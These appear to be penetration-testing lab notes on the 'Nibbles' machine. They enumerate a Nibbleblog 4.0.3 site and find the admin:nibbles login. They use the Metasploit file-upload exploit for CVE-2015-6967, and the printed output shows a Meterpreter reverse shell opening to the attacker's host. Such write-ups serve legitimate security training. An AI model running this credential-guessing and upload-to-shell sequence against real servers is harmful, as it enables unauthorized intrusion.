- http://10.10.10.75/ - landing page. "Hello world!"
- http://10.10.10.75/nibbleblog/
	- Various URLs to click on that redirect to landing page.
- http://10.10.10.75/nibbleblog/install.php - installs the blog.
	- Links to http://10.10.10.75/nibbleblog/update.php
- http://10.10.10.75/nibbleblog/admin/ - lots of directories  here

## Version
[Nibbleblog 4.0.3 "Coffee"](http://nibbleblog.com) ©2009 - 2014 | Developed by Diego Najar

![](WelcomeToNibbleBlog.png)

## Searching for vulnerabilities
```
┌──(kali㉿kali)-[~]
└─$ searchsploit nibble        
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections     | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload ( | php/remote/38489.rb
------------------------------------------- ---------------------------------
Shellcodes: No Results

```

# CVE-2015-6967
## msfconsole
```
msf > info 0

       Name: Nibbleblog File Upload Vulnerability
     Module: exploit/multi/http/nibbleblog_file_upload
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-09-01
<SNIP>
```
This module requires  a username and password....
Stepping through [content](http://10.10.10.75/nibbleblog/content/private/config.xml), here are some options:
- admin
- diego (or some variation)

admin:nibbles granted access

## Meterpreter shell
```
msf exploit(multi/http/nibbleblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Sending stage (40004 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.75:41482) at 2025-09-17 16:57:15 -0600

meterpreter > 

```
